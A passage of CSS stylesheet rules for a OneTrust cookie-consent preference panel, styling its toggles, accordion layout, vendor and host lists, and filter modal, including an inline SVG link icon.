            -o-transform: rotate(-45deg);
            -ms-transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg);
            left: 4px;
            top: 5px
        }
        
        #onetrust-pc-sdk .ot-label-txt {
            display: none
        }
        
        #onetrust-pc-sdk .ot-chkbox input,
        #onetrust-pc-sdk .ot-tgl input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0
        }
        
        #onetrust-pc-sdk .ot-arw-cntr {
            left: 5px;
            float: right;
            position: relative;
            pointer-events: none
        }
        
        #onetrust-pc-sdk .ot-arw {
            width: 16px;
            height: 16px;
            margin-left: 5px;
            color: dimgray;
            display: inline-block;
            vertical-align: middle;
            -webkit-transition: all 150ms ease-in 0s;
            -moz-transition: all 150ms ease-in 0s;
            -o-transition: all 150ms ease-in 0s;
            transition: all 150ms ease-in 0s
        }
        
        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw-cntr svg {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }
        
        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: 1px solid #000
        }
        
        #onetrust-pc-sdk .ot-acc-hdr {
            display: inline-block;
            width: 100%
        }
        
        #onetrust-pc-sdk #ot-fltr-modal .ot-label-txt {
            display: inline-block;
            font-size: .85em;
            color: dimgray
        }
        
        #onetrust-pc-sdk .ot-label-status {
            padding-left: 5px;
            font-size: .75em;
            display: none
        }
        
        #onetrust-pc-sdk .ot-plus-minus {
            width: 20px;
            height: 20px;
            font-size: 1.5em;
            position: relative;
            display: inline-block;
            margin-right: 5px;
            top: 3px
        }
        
        #onetrust-pc-sdk .ot-plus-minus span {
            position: absolute;
            background: #27455c;
            border-radius: 1px
        }
        
        #onetrust-pc-sdk .ot-plus-minus span:first-of-type {
            top: 25%;
            bottom: 25%;
            width: 10%;
            left: 45%
        }
        
        #onetrust-pc-sdk .ot-plus-minus span:last-of-type {
            left: 25%;
            right: 25%;
            height: 10%;
            top: 45%
        }
        
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:first-of-type,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            transform: rotate(90deg)
        }
        
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            left: 50%;
            right: 50%
        }
        
        #onetrust-pc-sdk .ot-host-item,
        #onetrust-pc-sdk .ot-ven-item {
            padding-right: 0
        }
        
        #onetrust-pc-sdk .ot-host-item .ot-plus-minus,
        #onetrust-pc-sdk .ot-ven-item .ot-plus-minus {
            float: left;
            margin-right: 8px;
            margin-top: 10px
        }
        
        #onetrust-pc-sdk .ot-ven-item ul {
            list-style: none inside;
            font-size: 100%;
            margin: 0
        }
        
        #onetrust-pc-sdk .ot-ven-item ul li {
            margin: 0 !important;
            padding: 0;
            border: none !important
        }
        
        #onetrust-pc-sdk .ot-hide-acc>button {
            pointer-events: none
        }
        
        #onetrust-pc-sdk .ot-hide-acc .ot-plus-minus>*,
        #onetrust-pc-sdk .ot-hide-acc .ot-arw-cntr>* {
            visibility: hidden
        }
        
        #onetrust-pc-sdk .ot-hide-acc .ot-acc-hdr {
            min-height: 30px
        }
        
        #onetrust-pc-sdk #ot-pc-title,
        #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk .ot-cat-header,
        #onetrust-pc-sdk .ot-cat-item p:last-of-type {
            color: dimgray
        }
        
        #onetrust-pc-sdk #ot-pc-title {
            margin-top: 20px;
            margin-bottom: 10px
        }
        
        #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-pc-sdk .ot-cat-item p {
            font-size: .79em;
            line-height: 1.4
        }
        
        #onetrust-pc-sdk #ot-pc-desc *,
        #onetrust-pc-sdk .ot-cat-item p * {
            font-size: inherit;
            line-height: inherit
        }
        
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk #ot-pc-title {
            font-size: 1.125em;
            line-height: 1.2
        }
        
        #onetrust-pc-sdk #ot-pc-desc {
            clear: both;
            font-size: .813em;
            line-height: 1.5;
            margin-bottom: 25px
        }
        
        #onetrust-pc-sdk #ot-pc-desc * {
            font-size: inherit
        }
        
        #onetrust-pc-sdk #ot-pc-desc a {
            display: block;
            margin-top: 5px;
            margin-bottom: 5px
        }
        
        #onetrust-pc-sdk #ot-pc-desc li {
            padding: 10px 0px
        }
        
        #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-pc-sdk #accept-recommended-btn-handler,
        #onetrust-pc-sdk #ot-pc-title,
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk .ot-cat-header {
            float: left
        }
        
        #onetrust-pc-sdk #ot-category-title {
            width: 100%;
            text-align: left
        }
        
        #onetrust-pc-sdk #ot-pc-title,
        #onetrust-pc-sdk #ot-category-title,
        #onetrust-pc-sdk .ot-cat-header,
        #onetrust-pc-sdk #ot-lst-title,
        #onetrust-pc-sdk .ot-ven-hdr .ot-ven-name,
        #onetrust-pc-sdk .ot-always-active {
            font-weight: bold
        }
        
        #onetrust-pc-sdk a {
            color: #656565;
            cursor: pointer
        }
        
        #onetrust-pc-sdk a:hover {
            color: #3860be
        }
        
        #onetrust-pc-sdk .ot-always-active {
            float: right;
            color: #3860be;
            margin-top: -2px
        }
        
        #onetrust-pc-sdk .ot-cat-header,
        #onetrust-pc-sdk .ot-always-active {
            font-size: .88em;
            line-height: 1.4;
            position: relative
        }
        
        #onetrust-pc-sdk .ot-cat-item {
            margin-top: 25px;
            line-height: 1.1
        }
        
        #onetrust-pc-sdk .ot-cat-item p:last-of-type {
            clear: both;
            padding-top: 15px;
            margin: 0
        }
        
        #onetrust-pc-sdk .ot-acc-txt p ul,
        #onetrust-pc-sdk .ot-cat-item ul,
        #onetrust-pc-sdk li.ot-subgrp p ul {
            margin: 0px;
            list-style: disc;
            margin-left: 15px
        }
        
        #onetrust-pc-sdk .ot-acc-txt p ul li,
        #onetrust-pc-sdk .ot-cat-item ul li,
        #onetrust-pc-sdk li.ot-subgrp p ul li {
            font-size: inherit;
            margin: 5px 0 0 0;
            padding: 0;
            border: none
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr {
            display: inline-block;
            width: 100%
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr .ot-tgl-cntr {
            float: right
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr .ot-tgl-cntr.ot-always-active-subgroup {
            width: auto
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li p,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li h5 {
            font-size: .813em;
            line-height: 1.5;
            color: dimgray
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr {
            display: inline-block;
            width: 100%;
            vertical-align: middle
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-txt {
            margin: 0
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li {
            margin: 10px 0 0 0;
            padding: 0;
            border: none
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li p {
            clear: both;
            float: left;
            padding-top: 10px;
            margin: 0
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li h5 {
            font-weight: bold;
            margin-bottom: 0;
            float: left;
            position: relative;
            top: 6px
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp {
            margin-left: 20px;
            overflow: hidden
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps li.ot-subgrp>p ul:first-child {
            padding-bottom: 7.5px
        }
        
        #onetrust-pc-sdk ul.ot-subgrps {
            margin: 0
        }
        
        #onetrust-pc-sdk .ot-hlst-cntr,
        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-top: 3px;
            overflow: hidden;
            clear: both;
            padding-left: 2px;
            padding-bottom: 2px
        }
        
        #onetrust-pc-sdk .ot-always-active-subgroup {
            width: auto;
            padding-left: 0px !important;
            top: 3px;
            position: relative
        }
        
        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-pc-sdk .category-host-list-handler {
            color: #3860be;
            margin-left: 0;
            font-size: .813em;
            text-decoration: none;
            float: left;
            margin-top: 5px
        }
        
        #onetrust-pc-sdk .category-vendors-list-handler:hover,
        #onetrust-pc-sdk .category-vendors-list-handler+a:hover,
        #onetrust-pc-sdk .category-host-list-handler:hover {
            text-decoration-line: underline
        }
        
        #onetrust-pc-sdk .category-vendors-list-handler+a {
            clear: none
        }
        
        #onetrust-pc-sdk .category-vendors-list-handler+a::after {
            content: "";
            height: 15px;
            width: 15px;
            background-repeat: no-repeat;
            margin-left: 5px;
            float: right;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 511.626 511.627'%3E%3Cg fill='%231276CE'%3E%3Cpath d='M392.857 292.354h-18.274c-2.669 0-4.859.855-6.563 2.573-1.718 1.708-2.573 3.897-2.573 6.563v91.361c0 12.563-4.47 23.315-13.415 32.262-8.945 8.945-19.701 13.414-32.264 13.414H82.224c-12.562 0-23.317-4.469-32.264-13.414-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562 4.471-23.313 13.417-32.259 8.947-8.947 19.702-13.418 32.264-13.418h200.994c2.669 0 4.859-.859 6.57-2.57 1.711-1.713 2.566-3.9 2.566-6.567V82.221c0-2.662-.855-4.853-2.566-6.563-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648 0-42.016 8.042-58.102 24.125C8.042 113.297 0 132.665 0 155.313v237.542c0 22.647 8.042 42.018 24.123 58.095 16.086 16.084 35.454 24.13 58.102 24.13h237.543c22.647 0 42.017-8.046 58.101-24.13 16.085-16.077 24.127-35.447 24.127-58.095v-91.358c0-2.669-.856-4.859-2.574-6.57-1.713-1.718-3.903-2.573-6.565-2.573z'/%3E%3Cpath d='M506.199 41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948 0-9.233 1.807-12.847 5.424-3.617 3.615-5.428 7.898-5.428 12.847s1.811 9.233 5.428 12.85l50.247 50.248-186.147 186.151c-1.906 1.903-2.856 4.093-2.856 6.563 0 2.479.953 4.668 2.856 6.571l32.548 32.544c1.903 1.903 4.093 2.852 6.567 2.852s4.665-.948 6.567-2.852l186.148-186.148 50.251 50.248c3.614 3.617 7.898 5.426 12.847 5.426s9.233-1.809 12.851-5.426c3.617-3.616 5.424-7.898 5.424-12.847V54.818c-.001-4.952-1.814-9.232-5.428-12.847z'/%3E%3C/g%3E%3C/svg%3E")
        }
        
        #onetrust-pc-sdk .back-btn-handler {
            min-height: 20px;
            font-size: 1em;
            text-decoration: none
        }
        
        #onetrust-pc-sdk .back-btn-handler svg {
            width: 12px;
            height: 12px
        }
        
        #onetrust-pc-sdk .back-btn-handler:hover {
            opacity: .6
        }
        
        #onetrust-pc-sdk #ot-lst-title h3 {
            word-break: break-word;
            word-wrap: break-word;
            margin-bottom: 0;
            color: #656565;
            font-weight: bold;
            margin-left: 15px;
            display: inline-block;
            font-size: 1em
        }
        
        #onetrust-pc-sdk #ot-lst-title {
            margin-top: 15px;
            font-size: 1em
        }
        
        #onetrust-pc-sdk #ot-pc-hdr {
            display: inline-block;
            padding-left: 27px;
            padding-right: 17px;
            width: calc(100% - 44px)
        }
        
        #onetrust-pc-sdk #ot-pc-hdr input::placeholder {
            color: #d4d4d4;
            font-style: italic
        }
        
        #onetrust-pc-sdk #vendor-search-handler {
            height: 31px;
            width: 100%;
            border-radius: 50px;
            font-size: .8em;
            padding-right: 35px;
            padding-left: 15px;
            float: left;
            margin-left: 15px
        }
        
        #onetrust-pc-sdk #ot-lst-cnt {
            transform: translate3d(0, 0, 0);
            position: relative;
            padding-left: 27px;
            margin-right: 10px;
            margin-top: 10px;
            width: calc(100% - 37px);
            top: 0;
            bottom: 70px;
            height: calc(100% - 94px);
            overflow-y: auto;
            overflow-x: hidden
        }
        
        #onetrust-pc-sdk #ot-pc-lst .ot-tgl-cntr {
            right: 32px;
            position: absolute;
            margin-top: 10px;
            height: 20px
        }
        
        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr):not(.ot-hosts-ui) .ot-tgl-cntr {
            right: 12px
        }
        
        #onetrust-pc-sdk #ot-sel-blk {
            position: sticky;
            position: -webkit-sticky;
            width: 100%;
            display: inline-block;
            top: 0;
            overflow: hidden;
            z-index: 3
        }
        
        #onetrust-pc-sdk #ot-sel-blk p {
            font-size: .75em;
            color: #6b6b6b;
            margin: 0;
            display: inline-block
        }
        
        #onetrust-pc-sdk .ot-enbl-chr>:not(.ot-hosts-ui) .ot-sel-all {
            padding-right: 33px
        }
        
        #onetrust-pc-sdk .ot-enbl-chr .ot-hosts-ui .ot-sel-all {
            padding-right: 23px
        }
        
        #onetrust-pc-sdk .ot-enbl-chr .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
            right: 105px
        }
        
        #onetrust-pc-sdk .ot-enbl-chr .ot-cat-item h5+.ot-tgl-cntr {
            padding-left: 31px;
            padding-right: 13px
        }
        
        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr,
        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr * {
            visibility: hidden
        }
        
        #onetrust-pc-sdk #ot-pc-content:not(.ot-enbl-chr) .ot-pli-hdr.ot-leg-border-color span:first-child {
            text-align: center
        }
        
        #onetrust-pc-sdk #ot-pc-content:not(.ot-enbl-chr) .ot-pli-hdr.ot-leg-border-color span:last-child {
            text-align: right
        }
        
        #onetrust-pc-sdk .ot-hosts-ui:not(.ot-enbl-chr) .ot-tgl-cntr {
            right: 23px
        }
        
        #onetrust-pc-sdk .ot-hosts-ui #ot-sel-blk {
            width: 100%
        }
        
        #onetrust-pc-sdk .ot-lst-subhdr {
            display: inline-block;
            width: 100%;
            margin-top: 10px
        }
        
        #onetrust-pc-sdk .ot-lst-subhdr svg {
            width: 30px;
            height: 30px;
            position: absolute;
            float: left;
            right: -15px
        }
        
        #onetrust-pc-sdk .ot-search-cntr {
            float: left;
            width: 82%;
            position: relative
        }
        
        #onetrust-pc-sdk .ot-fltr-cntr {
            float: right;
            right: 15px;
            position: relative
        }
        
        #onetrust-pc-sdk #filter-btn-handler {
            background-color: #3860be;
            border-radius: 17px;
            display: inline-block;
            position: relative;
            width: 32px;
            height: 32px;
            -moz-transition: .1s ease;
            -o-transition: .1s ease;
            -webkit-transition: 1s ease;
            transition: .1s ease;
            padding: 0;
            margin: 0
        }
        
        #onetrust-pc-sdk #filter-btn-handler:hover {
            opacity: .7
        }
        
        #onetrust-pc-sdk #filter-btn-handler svg {
            width: 12px;
            margin: 6px 10px 0 9px;
            display: block;
            height: 12px;
            position: static;
            right: auto;
            top: auto
        }
        
        #onetrust-pc-sdk .ot-ven-link {
            color: #3860be;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
            transform: translate(0, 1%);
            -o-transform: translate(0, 1%);
            -ms-transform: translate(0, 1%);
            -webkit-transform: translate(0, 1%);
            z-index: 2;
            position: relative;
            font-size: .75em
        }
        
        #onetrust-pc-sdk .ot-ven-link:hover {
            text-decoration: underline
        }
        
        #onetrust-pc-sdk .ot-ven-link * {
            font-size: inherit
        }
        
        #onetrust-pc-sdk .ot-ven-name {
            vertical-align: middle
        }
        
        #onetrust-pc-sdk .ot-ven-hdr,
        #onetrust-pc-sdk .ot-host-hdr {
            width: calc(100% - 165px);
            height: auto;
            float: left;
            text-align: left;
            word-break: break-word;
            word-wrap: break-word;
            vertical-align: middle;
            padding-bottom: 2px;
            padding-left: 2px
        }
        
        #onetrust-pc-sdk .ot-host-hdr {
            pointer-events: none;
            position: relative;
            z-index: 1
        }
        
        #onetrust-pc-sdk .ot-host-hdr .ot-host-name {
            pointer-events: none
        }
        
        #onetrust-pc-sdk .ot-host-hdr a {
            pointer-events: initial
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-info {
            font-size: .7em;
            line-height: 1.1
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-name,
        #onetrust-pc-sdk #ot-host-lst .ot-host-name a {
            color: dimgray;
            font-size: .81em;
            font-weight: bold;
            line-height: 1.4;
            margin-bottom: 5px;
            position: relative
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
        #onetrust-pc-sdk #ot-host-lst .ot-host-info a {
            font-size: 1em
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-desc {
            width: 100%;
            margin-bottom: 5px
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-expand,
        #onetrust-pc-sdk #ot-host-lst .ot-host-desc {
            color: dimgray;
            font-size: .69em;
            line-height: 1.4;
            float: left;
            font-weight: normal
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-hdr>a {
            text-decoration: underline;
            font-size: .69em;
            position: relative;
            z-index: 2;
            float: left;
            margin-bottom: 5px;
            line-height: 1.4
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-expand {
            color: #3860be
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-expand * {
            font-size: inherit
        }
        
        #onetrust-pc-sdk .ot-host-opt {
            margin: 0;
            font-size: inherit;
            display: inline-block;
            width: 100%
        }
        
        #onetrust-pc-sdk .ot-host-opt .ot-host-info {
            border: none;
            font-size: .8em;
            color: dimgray;
            display: inline-block;
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 10px;
            background-color: #f8f8f8
        }
        
        #onetrust-pc-sdk .ot-host-opt .ot-host-info>div {
            overflow: auto
        }
        
        #onetrust-pc-sdk .ot-host-opt li>div div {
            font-size: .8em;
            padding: 5px 0
        }
        
        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(1) {
            width: 30%;
            float: left
        }
        
        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(2) {
            width: 70%;
            float: left;
            word-break: break-word;
            word-wrap: break-word
        }
        
        #onetrust-pc-sdk #ot-ven-lst .ot-acc-hdr {
            overflow: hidden;
            cursor: pointer
        }
        
        #onetrust-pc-sdk .ot-ven-dets {
            border-radius: 2px;
            margin-top: 10px;
            background-color: #f8f8f8
        }
        
        #onetrust-pc-sdk .ot-ven-dets li:first-child p:first-child {
            border-top: none
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:not(:first-child) {
            border-top: 1px solid #e9e9e9
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p {
            display: inline-block
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(odd) {
            width: 30%
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(even) {
            width: 50%;
            word-break: break-word;
            word-wrap: break-word
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p,
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h4 {
            padding-top: 5px;
            padding-bottom: 5px;
            display: block
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h4 {
            display: inline-block
        }
        
        #onetrust-pc-sdk .ot-ven-dets p,
        #onetrust-pc-sdk .ot-ven-dets h4,
        #onetrust-pc-sdk .ot-ven-dets span {
            font-size: .69em;
            text-align: left;
            vertical-align: middle;
            word-break: break-word;
            word-wrap: break-word;
            margin: 0;
            padding-bottom: 10px;
            padding-left: 15px;
            color: #2e3644
        }
        
        #onetrust-pc-sdk .ot-ven-dets h4 {
            padding-top: 5px
        }
        
        #onetrust-pc-sdk .ot-ven-dets span {
            color: dimgray;
            padding: 0;
            vertical-align: baseline
        }
        
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-pur h4 {
            border-top: 1px solid #e9e9e9;
            border-bottom: 1px solid #e9e9e9;
            padding-bottom: 5px;
            margin-bottom: 5px;
            font-weight: bold
        }
        
        #onetrust-pc-sdk #no-results {
            text-align: center;
            margin-top: 30px;
            height: calc(100% - 300px);
            margin-left: 27px
        }
        
        #onetrust-pc-sdk #no-results span {
            font-weight: bold
        }
        
        #onetrust-pc-sdk #no-results p {
            font-size: 1em;
            color: #2e3644;
            word-break: break-word;
            word-wrap: break-word
        }
        
        #onetrust-pc-sdk #ot-fltr-modal {
            right: 13px;
            top: 87px;
            height: 90%;
            max-height: 370px;
            display: none;
            -moz-transition: .2s ease;
            -o-transition: .2s ease;
            -webkit-transition: 2s ease;
            transition: .2s ease;
            opacity: 1;
            position: absolute
        }
        
        #onetrust-pc-sdk #ot-fltr-cnt {
            z-index: 2147483646;
            background-color: #fff;
            position: relative;
            height: 100%;
            max-width: 325px;
            border-radius: 3px;
            padding-right: 10px;
            padding-bottom: 5px;
            -webkit-box-shadow: 0px 0px 12px 2px #c7c5c7;
            -moz-box-shadow: 0px 0px 12px 2px #c7c5c7;
            box-shadow: 0px 0px 12px 2px #c7c5c7
        }
        
        #onetrust-pc-sdk .ot-fltr-scrlcnt {
            overflow-y: auto;
            overflow-x: hidden;
            clear: both;
            max-height: calc(100% - 60px)
        }
        
        #onetrust-pc-sdk #ot-anchor {
            border: 12px solid transparent;
            display: none;
            position: absolute;
            z-index: 2147483647;
            right: 36px;
            top: 75px;
            transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            background-color: #fff;
            -webkit-box-shadow: -3px -3px 5px -2px #c7c5c7;
            -moz-box-shadow: -3px -3px 5px -2px #c7c5c7;
            box-shadow: -3px -3px 5px -2px #c7c5c7
        }
        
        #onetrust-pc-sdk .ot-fltr-btns {
            margin-left: 15px
        }
        
        #onetrust-pc-sdk #filter-apply-handler {
            margin-right: 15px
        }
        
        #onetrust-pc-sdk .ot-fltr-opt {
            margin-bottom: 20px;
            margin-left: 15px;
            width: 75%
        }
        
        #onetrust-pc-sdk .ot-fltr-opt label {
            padding-left: 30px
        }
        
        #onetrust-pc-sdk .ot-fltr-opt p {
            display: inline-block;
            margin: 0;
            font-size: .9em;
            color: #2e3644
        }
        
        #onetrust-pc-sdk #ot-sel-blk .ot-chkbox {
            width: 20px;
            height: 20px;
            float: right
        }
        
        #onetrust-pc-sdk .line-through label::after,
        #onetrust-pc-sdk[dir=rtl] .line-through label::after {
            height: auto;
            border-left: 0;
            transform: none;
            -o-transform: none;
            -ms-transform: none;
            -webkit-transform: none;
            left: 5px;
            top: 8px
        }
        
        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label,
        #onetrust-pc-sdk #ot-selall-gnvencntr label {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px;
            margin: 0
        }
        
        #onetrust-pc-sdk #ot-selall-vencntr input,
        #onetrust-pc-sdk #ot-selall-adtlvencntr input,
        #onetrust-pc-sdk #ot-selall-hostcntr input,
        #onetrust-pc-sdk #ot-selall-licntr input,
        #onetrust-pc-sdk #ot-selall-gnvencntr input {
            height: auto;
            width: auto;
            border-radius: 0;
            font-size: initial;
            padding: 0;
            float: none
        }
        
        #onetrust-pc-sdk #ot-ven-lst:first-child {
            border-top: 1px solid #e2e2e2
        }
        
        #onetrust-pc-sdk #vdr-lst-dsc {
            font-size: .812em;
            line-height: 1.5;
            padding: 10px 15px 5px 15px
        }
        
        #onetrust-pc-sdk #close-pc-btn-handler {
            margin: 0;
            float: right;
            height: 44px;
            width: 44px;
            background-size: 10px
        }
        
        #onetrust-pc-sdk #close-pc-btn-handler svg {
            display: block
        }
        
        #onetrust-pc-sdk .ot-close-icon {
            padding: 0;
            background-color: transparent;
            border: none
        }
        
        #onetrust-pc-sdk #clear-filters-handler {
            float: right;
            max-width: 200px;
            margin-bottom: 10px;
            text-decoration: none;
            margin-top: 20px;
            font-weight: bold;
            color: #3860be;
            font-size: .9em;
            letter-spacing: normal;
            border: none;
            padding: 1px
        }
        
        #onetrust-pc-sdk #clear-filters-handler:hover {
            color: #2285f7
        }
        
        #onetrust-pc-sdk #clear-filters-handler:focus {
            outline: #000 solid 1px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item {
            position: relative;
            border-radius: 1px;
            margin: 0;
            padding: 0;
            border: 1px solid #d8d8d8;
            border-top: none;
            float: left;
            width: calc(100% - 2px)
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type {
            margin-top: 10px;
            border-top: 1px solid #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item .ot-vlst-cntr:first-child {
            margin-top: 15px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item .ot-acc-grpdesc {
            font-size: .813em;
            line-height: 1.5;
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px)
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item .ot-acc-grpdesc ul {
            padding-bottom: 5px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            padding-top: 11.5px;
            padding-bottom: 11.5px;
            padding-left: 20px;
            padding-right: 15px;
            width: calc(100% - 35px);
            display: inline-block;
            position: relative;
            min-height: 25px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt {
            width: 100%;
            padding: 0px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr,
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc+.ot-leg-btn-container {
            padding-left: 20px;
            padding-right: 16px;
            width: calc(100% - 36px)
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc+.ot-leg-btn-container {
            margin-top: 5px;
            margin-bottom: 10px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr {
            z-index: 1;
            position: relative
        }
        
        #onetrust-pc-sdk .ot-accordion-layout input[type=checkbox]:checked~.ot-acc-txt.ot-acc-grpcntr {
            width: auto;
            padding-bottom: 15px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header {
            float: none;
            font-size: .88em;
            color: #2e3644;
            margin: 0;
            display: inline-block;
            height: auto;
            word-wrap: break-word;
            vertical-align: middle;
            min-height: inherit
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr {
            padding-left: 20px;
            width: calc(100% - 20px);
            display: inline-block;
            margin-top: 0;
            padding-bottom: 2px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active {
            right: 16px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
            right: 88px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
            right: 10px;
            margin-top: -2px;
            left: auto
        }
        
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active,
        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }
        
        #onetrust-pc-sdk #ot-category-title {
            padding-bottom: 10px
        }
        
        #onetrust-pc-sdk .ot-pli-hdr {
            color: #77808e;
            overflow: hidden;
            padding-top: 7.5px;
            padding-bottom: 7.5px;
            width: calc(100% - 2px);
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }
        
        #onetrust-pc-sdk .ot-pli-hdr .ot-li-title {
            float: right;
            font-size: .813em
        }
        
        #onetrust-pc-sdk .ot-pli-hdr span:first-child {
            top: 50%;
            transform: translateY(50%);
            max-width: 80px
        }
        
        #onetrust-pc-sdk .ot-pli-hdr span:last-child {
            text-align: center;
            max-width: 95px
        }
        
        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color {
            background-color: #f8f8f8;
            border: 1px solid #e9e9e9
        }
        
        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color span:first-child {
            text-align: left;
            width: 80px
        }
        
        #onetrust-pc-sdk .ot-subgrp>h5,
        #onetrust-pc-sdk .ot-cat-header {
            width: calc(100% - 130px);
            max-width: 60%
        }
        
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-subgrp>h5,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header {
            width: calc(100% - 145px)
        }
        
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item h5+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header+.ot-tgl {
            padding-left: 28px
        }
        
        #onetrust-pc-sdk .ot-acc-grpcntr .ot-acc-grpdesc {
            margin-bottom: 5px
        }
        
        #onetrust-pc-sdk .ot-acc-grpcntr .ot-subgrp-cntr {
            border-top: 1px solid #e9e9e9
        }
        
        #onetrust-pc-sdk .ot-acc-grpcntr .ot-subgrp-cntr ul.ot-subgrps li {
            margin-top: 5px;
            margin-bottom: 5px
        }
        
        #onetrust-pc-sdk .ot-acc-hdr .ot-arw-cntr+.ot-tgl,
